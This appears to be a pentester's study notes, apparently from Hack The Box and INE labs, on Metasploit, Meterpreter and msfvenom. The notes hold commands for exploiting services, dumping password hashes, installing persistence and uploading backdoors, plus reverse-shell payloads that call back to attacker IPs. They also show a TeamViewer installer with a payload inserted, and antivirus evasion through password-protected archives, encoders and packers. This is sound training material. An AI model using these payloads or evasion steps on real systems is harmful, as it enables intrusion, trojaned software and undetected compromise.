# First steps
## Before start
```bash
service PostgreSQL start
service metasploit start
```
## MSF - Initiate a Database
```bash
m1l0js@htb[/htb]$ sudo msfdb init 
```
Sometimes an error can occur if Metasploit is not up to date. This difference that causes the error can happen for several reasons. First, often it helps to update Metasploit again (apt update) to solve this problem. Then we can try to reinitialize the MSF database.
If the initialization is skipped and Metasploit tells us that the database is already configured, we can recheck the status of the database.
```bash
m1l0js@htb[/htb]$ sudo msfdb status
```
## MSF - Connect to the Initiated Database
```bash
m1l0js@htb[/htb]$ sudo msfdb run
```
If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:
```bash
m1l0js@htb[/htb]$ msfdb reinit
m1l0js@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
m1l0js@htb[/htb]$ sudo service postgresql restart
m1l0js@htb[/htb]$ msfconsole -q

msf6 > help
msf6 > db_status

[*] Connected to msf. Connection type: PostgreSQL.
```
## MSF - Using the Database
With the help of the database, we can manage many different categories and hosts that we have analyzed. Alternatively, the information about them that we have interacted with using Metasploit. These databases can be exported and imported. This is especially useful when we have extensive lists of hosts, loot, notes, and stored vulnerabilities for these hosts. After confirming that the database is successfully connected, we can organize our Workspaces.
### Workspaces
We can think of Workspaces the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.

To view the current Workspace list, use the workspace command. Adding a `-a` or `-d` switch after the command, followed by the workspace's name, will either add or delete that workspace to the database.
```bash
msf6 > workspace
* default
```
Notice that the default Workspace is named default and is currently in use according to the `*` symbol. Type the `workspace [name]` command to switch the presently used workspace. Looking back at our example, let us create a workspace for this assessment and select it.
```bash
msf6 > workspace -a Target_1
```
## File locations
### Modules
```bash
/usr/share/metasploit-framework/modules
```
### Plugins   
```txt
/usr/share/metasploit-framework/plugins
```
### Scripts
```txt
/usr/share/metasploit-framework/scripts/
```
### Tools 
Command-line utilities that can be called directly from the msfconsole menu.
```txt
/usr/share/metasploit-framework/tools/ 
```
## Some useful modules
```bash
auxiliary/scanner/discovery/arp_sweep
auxiliary/scanner/portscan/tcp
nmap --script smb-vulns-check.nse --script-args=unsafe=1 demo.ine.local
```
## Update MSF
```bash
m1l0js@htb[/htb]$ sudo apt update && sudo apt install metasploit-framework
```
### Old way
```bash
msfupdate
```
# Basic usage
## Some commands
Once msfconsole -q //We could use it
```bash
search <mysearchterm> //search linux
show exploits //Not very practical to use.
check //It would check if the service on the target is vulnerable to this exploit or not, instead of actually exploiting it.
back //If you want back to main prompt 
background //To return
exploit / run
```
### Example
```bash
search  httpfileserver
use exploit/windows/http/rejetto_hfs_exec
	info
	show options
	show payloads
	exploit
// Privilege escalation 
	sessions -l  //List sessions
	sessions -i 1 //Attach to a session
	sysinfo
	ipconfig
	route
	ps //List processes 
		ps -U SYSTEM
	getpid //See our process
	getuid //To know which user is running the process exploited by Metasploit
	getsystem // It runs a privilege escalation routine on the target machine.
// Check if UAC is enabled
	post/windows/gather/win_privs
// If you need to bypass the UAC 
	search bypassuac
	set session <select which you want>
 
use post/windows/gather/hashdump //It dumps the password database of a Windows machine
	set session <session id>
Uploading and Downloading files
	download HaxLogs.log /root/
	upload /root/backdoor.exe C:\\Windows //Note the backslash escaping
shell //A standard operating system shell
Persistence
exploit/windows/local/persistence
	background
/exploit/multi/handler //To kill all the sessions and check if we have installed the backdoor
remote port forwarding: After using auxiliary/scanner/portscan/tcp we could forward a remote machine port to the local machine port.
	portfwd add -l 1234 -p 21 -r 192.168.228.3
	portfwd lst 
	background 
	nmap -sS -sV -p 1234 localhost
search meterpreter
Reverse shell
	set payload windows/meterpreter/reverse/tcp
	set payload linux/x86/meterpreter/reverse_tcp
Bind shell
	set payload windows/meterpreter/bind_tcp
	set payload java/meterpreter/bind_tcp
```
### Another example
We could now check their home directory to find interesting files or alternatively leverage interesting modules such as
```bash
post/linux/gather/enum_users_history 
or 
exploit/multi/mysql/mysql_udf_payload: It's a MySQL UDF exploit which will create a User-Defined Function (UDF) and allow us to run arbitrary commands using it.
	set FORCE_UDF_UPLOAD true
	set PASSWORD fArFLP29UySm4bZj
	set RHOSTS server2.ine.local
	set TARGET 1
	set LHOST 192.73.96.2
	exploit
	session -i 2
auxiliary/scanner/http/tomcat_mgr_login: We will use msfvenom command to generate a malicious WAR file in order to gain the shell session on the Tomcat server
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.73.96.2 LPORT=443 -f war > shell.war
file shell.war
```
# Meterpreter
## What is Meterpreter?
The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that _uses DLL injection_ to ensure the *connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes*. Furthermore, Meterpreter *resides entirely in the memory of the remote host* and _leaves no traces on the hard drive_, making it difficult to detect with conventional forensic techniques.
It is dubbed the swiss army knife of pentesting, and for a good reason. The purpose of Meterpreter is to specifically improve our post-exploitation procedures, offering us a hand-picked set of relevant tools for more straightforward enumeration of the target host from the inside. It can help us find various privilege escalation techniques, AV evasion techniques, further vulnerability research, provide persistent access, pivot, et
For some interesting reading, check out this post on [Meterpreter stageless payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/) and this post on [modifying Metasploit templates for evasion](https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion/). These topics are outside the scope of this module, but we should be awarer of these possibilities.

Payload | **Staged** | **Stageless**
-- | ---| ---
Reverse TCP | windows/meterpreter/reverse_tcp | windows/meterpreter_reverse_tcp
Reverse HTTPS | windows/meterpreter/reverse_https | windows/meterpreter_reverse_https
Bind TCP | windows/meterpreter/bind_tcp | windows/meterpreter_bind_tcp
Reverse TCP IPv6 | windows/meterpreter/reverse_ipv6_tcp | windows/meterpreter_reverse_ipv6_tcp

## Running Meterpreter
To run Meterpreter, we only need to select any version of it from the show payloads output, taking into consideration the type of connection and OS we are attacking.
When the exploit is completed, the following events occur:
- _The target executes the initial stager_. This is usually a bind, reverse, findtag, passivex, etc.
- _The stager loads the DLL prefixed with Reflective_. The Reflective stub handles the *loading/injection* of the DLL
- The _Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET_. Metasploit receives this GET and configures the client.
- Lastly, Meterpreter loads extensions. _It will always load stdapi and load priv if the module gives administrative rights_. All of these extensions are loaded _over AES encryption_.
Whenever the Meterpreter Payload is sent and run on the target system, we receive a Meterpreter shell.
```bash
> meterpreter 
getuid
ps
steal_token 1836 # 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
getuid #Server username: NT AUTHORITY\NETWORK SERVICE
```
## Writing and importing modules
_To install any new Metasploit modules which have already been ported over by other users, one can choose to update their msfconsole from the terminal_, which will ensure that all newest exploits, auxiliaries, and features will be installed in the latest version of msfconsole. As long as the ported modules have been pushed into the main Metasploit-framework branch on GitHub, we should be updated with the latest modules.
However, _if we need only a specific module and do not want to perform a full upgrade, we can download that module and install it manually_. We will focus on searching ExploitDB for readily available Metasploit modules, which we can directly import into our version of msfconsole locally.
[ExploitDB](https://www.exploit-db.com/) is a great choice when searching for a custom exploit. We can use tags to search through the different exploitation scenarios for each available script. One of these tags is Metasploit Framework (MSF), which, if selected, will display only scripts that are also available in Metasploit module format. These can be directly downloaded from ExploitDB and installed in our local Metasploit Framework directory, from where they can be searched and called from within the msfconsole.
## Example
Let's say we want to use an exploit found for Nagios3, which will take advantage of a command injection vulnerability. The module we are looking for is _Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)_. So we fire up msfconsole and try to search for that specific exploit, but we cannot find it. This means that our Metasploit framework is not up to date or that the specific Nagios3 exploit module we are looking for is not in the official updated release of the Metasploit Framework.
_We can_, however, _find the exploit code inside ExploitDB's entries_. Alternatively, if we do not want to use our web browser to search for a specific exploit within ExploitDB, we can use the CLI version, _searchsploit_.
Note that the hosted file terminations that end in .rb are Ruby scripts that most likely have been crafted specifically for use within msfconsole. We can also filter only by .rb file terminations to avoid output from scripts that cannot run within msfconsole. Note that not all .rb files are automatically converted to msfconsole modules. Some exploits are written in Ruby without having any Metasploit module-compatible code in them. We will look at one of these examples in the following sub-section.
```bash
m1l0js@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"
```
We have to download the .rb file and place it in the correct directory. _The default directory where all the modules, scripts, plugins, and msfconsole proprietary files are stored is /usr/share/metasploit-framework_. The critical folders are also symlinked in our home and root folders in the hidden ~/.msf4/ location.
```bash
m1l0js@htb[/htb]$ ls /usr/share/metasploit-framework/
m1l0js@htb[/htb]$ ls .msf4/
```
We copy it into the appropriate directory after downloading the exploit. _Note that our home folder .msf4 location might not have all the folder structure that the /usr/share/metasploit-framework/ one might have. So, we will just need to mkdir the appropriate folders so that the structure is the same as the original folder so that msfconsole can find the new modules_. After that, we will be proceeding with copying the .rb script directly into the primary location.
Please note that there are certain naming conventions that, if not adequately respected, will generate errors when trying to get msfconsole to recognize the new module we installed. Always use snake-case, alphanumeric characters, and underscores instead of dashes.
* MSF - Loading Additional Modules at Runtime
```bash
m1l0js@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
m1l0js@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
```
* MSF - Loading Additional Modules
```bash
msf6> loadpath /usr/share/metasploit-framework/modules/
```

*Alternatively* , we can also launch msfconsole and run the reload_all command for the newly installed module to appear in the list. After the command is run and no errors are reported, try either the search [name] function inside msfconsole or directly with the use [module-path] to jump straight into the newly installed module.
* Other example
```bash
m1l0js@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
bludit_upload_images_exec.rb
m1l0js@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
```
## Writing our own module
Function	                     | Description
--- | --- 
Msf::Exploit::Remote::HttpClient |	This module provides methods for acting as an HTTP client when exploiting an HTTP server.
Msf::Exploit::PhpEXE	            | This is a method for generating a first-stage php payload.
Msf::Exploit::FileDropper |	        This method transfers files and handles file clean-up after a session with the target is established.
Msf::Auxiliary::Report	            | This module provides methods for reporting data to the MSF DB.
If you would like to learn more about porting scripts into the Metasploit Framework, check out the [Metasploit: A Penetration Tester's Guide](https://nostarch.com/metasploit) book has also created blog posts on this topic, which can be found [here](https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/) 


# Msfvenom
## Introduction to MSFVenom
MSFVenom is the _successor_ of *MSFPayload* and *MSFEncode*, two stand-alone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits.

MSFVenom is the result of the marriage between these two tools. Before this tool, we had to pipe (|) the result from MSFPayload, which was used to generate shellcode for a specific processor architecture and OS release, into MSFEncode, which contained multiple encoding schemes used both for removing bad characters from shellcode. This could sometimes cause instability during the runtime - and for evading older Anti-Virus (AV) and endpoint Intrusion Prevention / Intrusion Detection (IPS/IDS) software.

Nowadays, the two combined tools offer penetration testers a method to quickly craft payloads for different target host architectures and releases while having the possibility to 'clean up' their shellcode so that it does not run into any errors when deployed. The AV evasion part is much more complicated today, as signature-only-based analysis of malicious files is a thing of the past. Heuristic analysis, machine learning, and deep packet inspection make it much harder for a payload to run through several subsequent iterations of an encoding scheme to evade any good AV software. 

## Creating our payloads
Let's suppose we have found an open FTP port that either had weak credentials or was open to Anonymous login by accident. Now, suppose that the FTP server itself is linked to a web service running on port tcp/80 of the same machine and that all of the files found in the FTP root directory can be viewed in the web-service's /uploads directory. Let's also suppose that the web service does not have any checks for what we are allowed to run on it as a client.
Suppose we are hypothetically allowed to call anything we want from the web service. In that case, we can upload a PHP shell directly through the FTP server and access it from the web, triggering the payload and allowing us to receive a reverse TCP connection from the victim machine.
```bash
m1l0js@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```
Now, we only need to navigate to http://10.10.10.5/reverse_shell.aspx, and it will trigger the .aspx payload. Before we do that, however, we should start a listener on msfconsole so that the reverse connection request gets caught inside it.
```bash
msf6 > use multi/handler
```
Now we can trigger the .aspx payload on the web service. Doing so will load absolutely nothing visually speaking on the page, but looking back to our multi/handler module, we would have received a connection. We should ensure that our .aspx file does not contain HTML, so we will only see a blank web page. However, the payload is executed in the background anyway.

If the Meterpreter session dies too often, we can consider encoding it to avoid errors during runtime. We can pick any viable encoder, and it will ultimately improve our chances of success regardless.

## Firewall and IDS/IPS evasion
Security Policy |	                            Description
--- | ---
Signature-based Detection | 	                The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms.
Heuristic / Statistical Anomaly Detection	| Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms.
Stateful Protocol Analysis Detection |	    Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity.
Live-monitoring and Alerting (SOC-based) | 	A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the automated mechanisms take action instead.

--- 
## Evasion Techniques

Most host-based anti-virus software nowadays relies mainly on Signature-based Detection to identify aspects of malicious code present in a software sample. _These signatures are placed inside the Antivirus Engine, where they are subsequently used to scan storage space and running processes for any matches_. When a piece of unknown software lands on a partition and is matched by the Antivirus software, most Anti-viruses quarantine the malicious program and kill the running process.

### How do we circumvent all this heat?
We play along with it. The examples shown in the Encoders section show that simply encoding payloads using different encoding schemes with multiple iterations is not enough for all AV products. Moreover, merely establishing a channel of communication between the attacker and the victim can raise some alarms with the current capabilities of IDS/IPS products out there.
However, _with the MSF6 release_ , _msfconsole can tunnel AES-encrypted communication from any Meterpreter shell back to the attacker host, successfully encrypting the traffic as the payload is sent to the victim host_. This mostly takes care of the network-based IDS/IPS. In some rare cases, we might be met with very strict traffic rulesets that flag our connection based on the sender's IP address. The only way to circumvent this is to find the services being let through. An excellent example of this would be the Equifax hack of 2017, where malicious hackers have abused the Apache Struts vulnerability to access a network of critical data servers. DNS exfiltration techniques were used to slowly siphon data out of the network and into the hackers' domain without being noticed for months. To learn more about this attack, visit the links below:
* *[US Government Post-Mortem Report on the Equifax Hack](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjl2dmitsD-AhUyUKQEHdJrB8sQFnoECAsQAQ&url=https%3A%2F%2Fwww.zdnet.com%2Farticle%2Fus-government-releases-post-mortem-report-on-equifax-hack%2F&usg=AOvVaw3PmKk9j7WPQ9fHF6TSJxkK)
* [DNS tunneling](https://blogs.blackberry.com/en/2023/03/dns-tunneling-guide-to-detection-and-prevention)

Returning to msfconsole, its capability to now sustain AES-encrypted tunnels, together with Meterpreter's feature of running in memory, raises our capability by a margin. However, _we still have the issue of what happens to a payload once it reaches its destination, before it is run and placed into memory_. _This file could be fingerprinted for its signature, matched against the database, and blocked, together with our chances of accessing the target_. We can also be sure that AV software developers are looking at msfconsole modules and capabilities to add the resulting code and files to their signature database, resulting in most if not all of the default payloads being immediately shut down by AV software nowadays.

We are in luck because _msfvenom offers the option of using executable templates_. This allows us to use some pre-set templates for executable files, inject our payload into them (no pun intended), and use any executable as a platform from which we can launch our attack. We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatly obfuscates our malicious code and, more importantly, lowers our detection chances. There are many valid combinations between:
* Actual legitimate executable files
* Our different encoding schemes and their iterations
* Our different payload shellcode variants. This generates what is called a backdoored executable.
```bash
m1l0js@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

For the most part, when a target launches a backdoored executable, nothing will appear to happen, which can raise suspicions in some cases. To improve our chances, _we need to trigger the continuation of the normal execution of the launched application while pulling the payload in a separate thread from the main application_. We do so with the _-k_ flag as it appears above. However, even with the -k flag running, the target will only notice the running backdoor if they launch the backdoored executable template from a CLI environment. If they do so, a separate window will pop up with the payload, which will not close until we finish running the payload session interaction on the target.

### Archives
Archiving a piece of information such as a file, folder, script, executable, picture, or document and _placing a password on the archive bypasses a lot of common anti-virus signatures today_. However, the downside of this process is that they will be raised as notifications in the AV alarm dashboard as being unable to be scanned due to being locked with a password. An administrator can choose to manually inspect these archives to determine if they are malicious or not.
```bash
m1l0js@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```
If we check against VirusTotal to get a detection baseline from the payload we generated, the results will be the following.
```bash
m1l0js@htb[/htb]$ msf-virustotal -k <API key> -f test.js 
```
Now, try archiving it two times, passwording both archives upon creation, and removing the .rar/.zip/.7z extension from their names. For this purpose, we can install the [RAR](https://www.rarlab.com/download.htm) utility from RARLabs, which works precisely like WinRAR on Windows.
```bash
m1l0js@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
m1l0js@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
m1l0js@htb[/htb]$ rar a ~/test.rar -p ~/test.js

m1l0js@htb[/htb]$ ls
test.js   test.rar

m1l0js@htb[/htb]$ mv test.rar test
m1l0js@htb[/htb]$ ls
test   test.js

m1l0js@htb[/htb]$ rar a test2.rar -p test //Archiving the payload again

m1l0js@htb[/htb]$ mv test2.rar test2
m1l0js@htb[/htb]$ ls
test   test2   test.js
```
The test2 file is the final .rar archive with the extension (.rar) deleted from the name. After that, we can proceed to upload it on VirusTotal for another check.
```bash
m1l0js@htb[/htb]$ msf-virustotal -k <API key> -f test2
//Success. False in all AV solutions
```

### Packers
The term Packer refers to the result of an executable compression process where _the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts_. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.

A list of popular packer software:
* *[UPX](https://upx.github.io/) packer
* *[The Enigma Protector](https://enigmaprotector.com/)	
* [MPRESS](https://www.matcode.com/mpress.htm)
* Alternate EXE Packer	
* ExeStealth	            
* Morphine
* MEW	                    
* Themida	

If we want to learn more about packers, please check out the [PolyPack project](https://jon.oberheide.org/files/woot09-polypack.pdf)
    
### Exploit Coding
When coding our exploit or porting a pre-existing one over to the Framework, it is good to ensure that the exploit code is not easily identifiable by security measures implemented on the target system.
For example, a typical Buffer Overflow exploit might be easily distinguished from regular traffic traveling over the network due to its hexadecimal buffer patterns. IDS / IPS placements can check the traffic towards the target machine and notice specific overused patterns for exploiting code.
_When assembling our exploit code, randomization can help add some variation to those patterns, which will break the IPS / IDS database signatures for well-known exploit buffers_. This can be done by inputting an Offset switch inside the code for the msfconsole module:
```bash
'Targets' =>
[
 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```
_Besides the BoF code, one should always avoid using obvious NOP sleds where the shellcode should land after the overflow is completed_. Please note that the BoF code's purpose is to crash the service running on the target machine, while the NOP sled is the allocated memory where our shellcode (the payload) is inserted. IPS/IDS entities regularly check both of these, so it is good to test our custom exploit code against a sandbox environment before deploying it on the client network. Of course, we might only have one chance to do this correctly during an assessment.

For more information about exploit coding, we recommend checking out the [Metasploit - The Penetration Tester's Guide](https://nostarch.com/metasploit) book from No Starch Press. They delve into quite some detail about creating our exploits for the Framework.


## Local Exploit Suggester
As a tip, there is a module called the Local Exploit Suggester. This module _suggests local meterpreter exploits that can be used_. 
The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter. It's important to note that not all local exploits will be fired. 
Exploits are chosen based on these conditions: 
- Session type
- Platform
- Architecture
- Required default options
```bash
msf6 > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
```



```bash
msfvenom --list payloads | grep "linux"
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
```

# Payloads
## Common payloads used for Windows machines
Payload	                        | Description
-- | --
generic/custom	                | Generic listener, multi-use
generic/shell_bind_tcp	        | Generic listener, multi-use, normal shell, TCP connection binding
generic/shell_reverse_tcp	    | Generic listener, multi-use, normal shell, reverse TCP connection
windows/x64/exec	            | Executes an arbitrary command (Windows x64)
windows/x64/loadlibrary	        | Loads an arbitrary x64 library path
windows/x64/messagebox	        | Spawns a dialog via MessageBox using a customizable title, text & icon
windows/x64/shell_reverse_tcp	| Normal shell, single payload, reverse TCP connection
windows/x64/shell/reverse_tcp	| Normal shell, stager + stage, reverse TCP connection
windows/x64/shell/bind_ipv6_tcp	| Normal shell, stager + stage, IPv6 Bind TCP stager
windows/x64/meterpreter/$	    | Meterpreter payload + varieties above
windows/x64/powershell/$	    | Interactive PowerShell sessions + varieties above
windows/x64/vncinject/$	        | VNC Server (Reflective Injection) + varieties above
